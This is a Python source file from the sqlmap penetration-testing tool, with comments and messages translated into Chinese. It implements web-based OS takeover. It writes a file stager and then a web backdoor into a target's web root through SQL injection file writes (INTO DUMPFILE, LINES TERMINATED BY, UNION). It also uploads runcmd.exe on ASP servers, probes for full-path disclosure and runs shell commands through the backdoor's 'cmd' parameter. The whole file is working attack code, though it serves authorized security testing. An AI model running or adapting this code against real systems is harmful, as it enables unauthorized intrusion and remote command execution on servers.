#!/usr/bin/env python
#coding=utf-8
"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os
import posixpath
import re
import StringIO
import tempfile
import urlparse

from extra.cloak.cloak import decloak
from lib.core.agent import agent
from lib.core.common import arrayizeValue
from lib.core.common import Backend
from lib.core.common import extractRegexResult
from lib.core.common import getAutoDirectories
from lib.core.common import getManualDirectories
from lib.core.common import getPublicTypeMembers
from lib.core.common import getSQLSnippet
from lib.core.common import getUnicode
from lib.core.common import ntToPosixSlashes
from lib.core.common import isTechniqueAvailable
from lib.core.common import isWindowsDriveLetterPath
from lib.core.common import normalizePath
from lib.core.common import parseFilePaths
from lib.core.common import posixToNtSlashes
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import singleTimeWarnMessage
from lib.core.convert import hexencode
from lib.core.convert import utf8encode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.enums import DBMS
from lib.core.enums import HTTP_HEADER
from lib.core.enums import OS
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.enums import WEB_API
from lib.core.exception import SqlmapNoneDataException
from lib.core.settings import BACKDOOR_RUN_CMD_TIMEOUT
from lib.core.settings import EVENTVALIDATION_REGEX
from lib.core.settings import VIEWSTATE_REGEX
from lib.request.connect import Connect as Request
from thirdparty.oset.pyoset import oset


class Web:
    """
    这个类为插件定义了面向web的OS接管功能。
    """

    def __init__(self):
        self.webApi = None
        self.webBaseUrl = None
        self.webBackdoorUrl = None
        self.webBackdoorFilePath = None
        self.webStagerUrl = None
        self.webStagerFilePath = None
        self.webDirectory = None

    def webBackdoorRunCmd(self, cmd):
        if self.webBackdoorUrl is None:
            return

        output = None

        if not cmd:
            cmd = conf.osCmd

        cmdUrl = "%s?cmd=%s" % (self.webBackdoorUrl, cmd)
        page, _, _ = Request.getPage(url=cmdUrl, direct=True, silent=True, timeout=BACKDOOR_RUN_CMD_TIMEOUT)

        if page is not None:
            output = re.search("<pre>(.+?)</pre>", page, re.I | re.S)

            if output:
                output = output.group(1)

        return output

    def webUpload(self, destFileName, directory, stream=None, content=None, filepath=None):
        if filepath is not None:
            if filepath.endswith('_'):
                content = decloak(filepath)  # 隐藏文件
            else:
                with open(filepath, "rb") as f:
                    content = f.read()

        if content is not None:
            stream = StringIO.StringIO(content)  # 字符串内容

        return self._webFileStreamUpload(stream, destFileName, directory)

    def _webFileStreamUpload(self, stream, destFileName, directory):
        stream.seek(0)  # Rewind

        try:
            setattr(stream, "name", destFileName)
        except TypeError:
            pass

        if self.webApi in getPublicTypeMembers(WEB_API, True):
            multipartParams = {
                                "upload":    "1",
                                "file":      stream,
                                "uploadDir": directory,
                              }

            if self.webApi == WEB_API.ASPX:
                multipartParams['__EVENTVALIDATION'] = kb.data.__EVENTVALIDATION
                multipartParams['__VIEWSTATE'] = kb.data.__VIEWSTATE

            page, _, _ = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)

            if "File uploaded" not in page:
                warnMsg = u"无法通过web file stager上传文件到'%s'" % directory
                logger.warn(warnMsg)
                return False
            else:
                return True
        else:
            logger.error(u"sqlmap没有一个web后门，也没有一个web文件stager的%s" % self.webApi)
            return False

    def _webFileInject(self, fileContent, fileName, directory):
        outFile = posixpath.join(ntToPosixSlashes(directory), fileName)
        uplQuery = getUnicode(fileContent).replace("WRITABLE_DIR", directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
        query = ""

        if isTechniqueAvailable(kb.technique):
            where = kb.injection.data[kb.technique].where

            if where == PAYLOAD.WHERE.NEGATIVE:
                randInt = randomInt()
                query += "OR %d=%d " % (randInt, randInt)

        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=hexencode(uplQuery))
        query = agent.prefixQuery(query)
        query = agent.suffixQuery(query)
        payload = agent.payload(newValue=query)
        page = Request.queryPage(payload)

        return page

    def webInit(self):
        """
        此方法用于在 web 服务器文档根目录中的可写远程目录中写入 web 后门 (代理)。
        """

        if self.webBackdoorUrl is not None and self.webStagerUrl is not None and self.webApi is not None:
            return

        self.checkDbmsOs()

        default = None
        choices = list(getPublicTypeMembers(WEB_API, True))

        for ext in choices:
            if conf.url.endswith(ext):
                default = ext
                break

        if not default:
            default = WEB_API.ASP if Backend.isOs(OS.WINDOWS) else WEB_API.PHP

        message = u"Web服务器支持哪种Web应用程序语言?\n"

        for count in xrange(len(choices)):
            ext = choices[count]
            message += "[%d] %s%s\n" % (count + 1, ext.upper(), (" (default)" if default == ext else ""))

            if default == ext:
                default = count + 1

        message = message[:-1]

        while True:
            choice = readInput(message, default=str(default))

            if not choice.isdigit():
                logger.warn("无效值，只允许使用数字")

            elif int(choice) < 1 or int(choice) > len(choices):
                logger.warn("无效值，它必须介于1和%d之间" % len(choices))

            else:
                self.webApi = choices[int(choice) - 1]
                break

        if not kb.absFilePaths:
            message = "你是否希望sqlmap进一步尝试引发完整的路径泄露? [Y/n] "

            if readInput(message, default='Y', boolean=True):
                headers = {}
                been = set([conf.url])

                for match in re.finditer(r"=['\"]((https?):)?(//[^/'\"]+)?(/[\w/.-]*)\bwp-", kb.originalPage or "", re.I):
                    url = "%s%s" % (conf.url.replace(conf.path, match.group(4)), "wp-content/wp-db.php")
                    if url not in been:
                        try:
                            page, _, _ = Request.getPage(url=url, raise404=False, silent=True)
                            parseFilePaths(page)
                        except:
                            pass
                        finally:
                            been.add(url)

                url = re.sub(r"(\.\w+)\Z", "~\g<1>", conf.url)
                if url not in been:
                    try:
                        page, _, _ = Request.getPage(url=url, raise404=False, silent=True)
                        parseFilePaths(page)
                    except:
                        pass
                    finally:
                        been.add(url)

                for place in (PLACE.GET, PLACE.POST):
                    if place in conf.parameters:
                        value = re.sub(r"(\A|&)(\w+)=", "\g<2>[]=", conf.parameters[place])
                        if "[]" in value:
                            page, headers, _ = Request.queryPage(value=value, place=place, content=True, raise404=False, silent=True, noteResponseTime=False)
                            parseFilePaths(page)

                cookie = None
                if PLACE.COOKIE in conf.parameters:
                    cookie = conf.parameters[PLACE.COOKIE]
                elif headers and HTTP_HEADER.SET_COOKIE in headers:
                    cookie = headers[HTTP_HEADER.SET_COOKIE]

                if cookie:
                    value = re.sub(r"(\A|;)(\w+)=[^;]*", "\g<2>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", cookie)
                    if value != cookie:
                        page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
                        parseFilePaths(page)

                    value = re.sub(r"(\A|;)(\w+)=[^;]*", "\g<2>=", cookie)
                    if value != cookie:
                        page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
                        parseFilePaths(page)

        directories = list(arrayizeValue(getManualDirectories()))
        directories.extend(getAutoDirectories())
        directories = list(oset(directories))

        path = urlparse.urlparse(conf.url).path or '/'
        if path != '/':
            _ = []
            for directory in directories:
                _.append(directory)
                if not directory.endswith(path):
                    _.append("%s/%s" % (directory.rstrip('/'), path.strip('/')))
            directories = _

        backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
        backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi))

        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))

        for directory in directories:
            if not directory:
                continue

            stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
            self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)

            uploaded = False
            directory = ntToPosixSlashes(normalizePath(directory))

            if not isWindowsDriveLetterPath(directory) and not directory.startswith('/'):
                directory = "/%s" % directory

            if not directory.endswith('/'):
                directory += '/'

            # 使用LIMIT 0，1 INTO DUMPFILE方法上传文件
            #LINES子句：在LINES子句中使用TERMINATED BY指定一行结束的标志，如“LINES TERMINATED BY '?'”表示一行以“?”作为结束标志。"
            infoMsg = u"尝试通过LIMIT'LINES TERMINATED BY'方法上传'%s'上的文件" % directory
            logger.info(infoMsg)
            self._webFileInject(stagerContent, stagerName, directory)

            for match in re.finditer('/', directory):
                self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
                self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)
                debugMsg = u"尝试查看该文件是否可以从'%s'访问" % self.webStagerUrl
                logger.debug(debugMsg)

                uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
                uplPage = uplPage or ""

                if "sqlmap file uploader" in uplPage:
                    uploaded = True
                    break

            # 退回到UNION查询文件上传方法
            if not uploaded:
                warnMsg = u"无法在'%s'中上传文件" % directory
                singleTimeWarnMessage(warnMsg)

                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                    infoMsg = u"尝试通过UNION方法将文件上传到'%s'上" % directory
                    logger.info(infoMsg)

                    stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
                    self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)

                    handle, filename = tempfile.mkstemp()
                    os.close(handle)

                    with open(filename, "w+b") as f:
                        _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
                        _ = _.replace("WRITABLE_DIR", utf8encode(directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
                        f.write(_)

                    self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)

                    for match in re.finditer('/', directory):
                        self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
                        self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)

                        debugMsg = u"正在尝试查看文件是否可以从'%s'访问" % self.webStagerUrl
                        logger.debug(debugMsg)

                        uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
                        uplPage = uplPage or ""

                        if "sqlmap file uploader" in uplPage:
                            uploaded = True
                            break

            if not uploaded:
                continue

            if "<%" in uplPage or "<?" in uplPage:
                warnMsg = u"文件stager上传在'%s', " % directory
                warnMsg += u"但不动态解释"
                logger.warn(warnMsg)
                continue

            elif self.webApi == WEB_API.ASPX:
                kb.data.__EVENTVALIDATION = extractRegexResult(EVENTVALIDATION_REGEX, uplPage)
                kb.data.__VIEWSTATE = extractRegexResult(VIEWSTATE_REGEX, uplPage)

            infoMsg = u"文件stager已成功上传到'%s' - %s" % (directory, self.webStagerUrl)
            logger.info(infoMsg)

            if self.webApi == WEB_API.ASP:
                match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)

                if match:
                    backdoorDirectory = match.group(1)
                else:
                    continue

                _ = "tmpe%s.exe" % randomStr(lowercase=True)
                if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", _)):
                    self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_EXTRAS_PATH, "runcmd", "runcmd.exe_"))
                    self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
                    self.webDirectory = backdoorDirectory
                else:
                    continue

            else:
                if not self.webUpload(backdoorName, posixToNtSlashes(directory) if Backend.isOs(OS.WINDOWS) else directory, content=backdoorContent):
                    warnMsg = u"后门没有通过file stager成功上传，"
                    warnMsg += u"这可能是因为运行Web服务器进程的用户没有权限"
                    warnMsg += u"在运行DBMS进程的用户文件夹中上传文件，因为没有写入权限，"
                    warnMsg += u"或者因为DBMS和Web服务位于不同的服务器上"
                    logger.warn(warnMsg)

                    message = u"你想尝试使用与文件stager相同的方法? [Y/n] "

                    if readInput(message, default='Y', boolean=True):
                        self._webFileInject(backdoorContent, backdoorName, directory)
                    else:
                        continue

                self.webBackdoorUrl = posixpath.join(ntToPosixSlashes(self.webBaseUrl), backdoorName)
                self.webDirectory = directory

            self.webBackdoorFilePath = posixpath.join(ntToPosixSlashes(directory), backdoorName)

            testStr = u"命令执行测试"
            output = self.webBackdoorRunCmd("echo %s" % testStr)

            if output == "0":
                warnMsg = u"后门已经上传，但缺少运行系统命令的必需权限"
                raise SqlmapNoneDataException(warnMsg)
            elif output and testStr in output:
                infoMsg = u"后门已经成功 "
            else:
                infoMsg = u"后门可能已经成功 "

            infoMsg += u"上传到'%s' - " % self.webDirectory
            infoMsg += self.webBackdoorUrl
            logger.info(infoMsg)

            break
